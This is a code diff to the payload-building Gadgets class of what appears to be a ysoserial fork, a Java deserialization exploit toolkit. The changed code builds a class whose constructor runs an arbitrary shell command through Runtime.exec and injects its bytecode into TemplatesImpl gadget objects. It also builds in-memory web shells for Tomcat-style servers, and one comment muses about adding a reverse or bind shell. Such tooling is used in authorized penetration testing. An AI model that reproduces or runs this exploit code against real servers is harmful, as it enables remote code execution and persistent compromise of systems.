@@ -16,6 +16,7 @@ import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtConstructor;
 import javassist.bytecode.ClassFile;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
@@ -44,25 +45,6 @@ public class Gadgets {
     }
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
-    }
-
 
     public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
@@ -112,48 +94,50 @@ public class Gadgets {
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static Object createTemplatesImpl ( final byte[] classBytes ) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
+            return createTemplatesImpl(
+                classBytes,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImpl(classBytes, TemplatesImpl.class, TransformerFactoryImpl.class);
+    }
+
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
-        final T templates = tplClass.newInstance();
-
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
             "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
+        CtClass clazz = pool.makeClass("a");
+        clazz.setSuperclass(pool.get(abstTranslet.getName()));
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, clazz);
+        ctConstructor.setBody(cmd);
+        clazz.addConstructor(ctConstructor);
         clazz.getClassFile().setMajorVersion(ClassFile.JAVA_6);
 
         final byte[] classBytes = clazz.toBytecode();
+        clazz.defrost();
+        return createTemplatesImpl(classBytes, tplClass, transFactory);
+    }
+    public static <T> T createTemplatesImpl ( final byte[] classBytes, Class<T> tplClass, Class<?> transFactory ) throws Exception {
+        final T templates = tplClass.newInstance();
 
-        // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_name", "a");
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
     public static <T> T createTemplatesImplInjectMemshell (String memshellName) throws Exception {
-        return createTemplatesImplInjectMemshell(memshellName, 6);
-    }
-
-    public static <T> T createTemplatesImplInjectMemshell (String memshellName, int javaVersion) throws Exception {
-        final T templates = (T) TemplatesImpl.class.newInstance();
-
         if (memshellName.indexOf(".") == -1) {
             String memshellPackage = "ysoserial.bullet.tmpl.memshell.";
             if (memshellName.startsWith("Tomcat")) {
@@ -166,16 +150,10 @@ public class Gadgets {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.get(memshellName);
         ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
-        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_1 + javaVersion - 1);
+        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);
         byte[] classBytes = ctClass.toBytecode();
 
-        // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
-
-        // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "a");
-        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-        return templates;
+        return (T) createTemplatesImpl(classBytes);
     }
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
